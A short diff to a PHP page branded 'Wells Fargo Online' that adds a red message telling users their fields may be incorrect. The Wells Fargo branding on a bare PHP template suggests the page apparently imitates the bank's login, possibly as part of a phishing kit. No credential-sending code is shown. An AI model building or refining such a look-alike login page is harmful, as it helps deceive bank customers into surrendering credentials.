@@ -108,7 +108,15 @@ if( isset($_GET['id'])){
                                 <a href="#" class="enroll-text">Forgot Password/Username?</a>
                             </div>
                             <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
-
+                            <?php
+                            if( $error != ""){
+                            ?>
+                            <p style="color: red; font-size: 1.2em; font-weight: bold;">
+                                Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
+                            </p>
+                            <?php
+                            }
+                            ?>
                         </form>
                     </div>
                     <div class="appstoreBadge" id="ios">
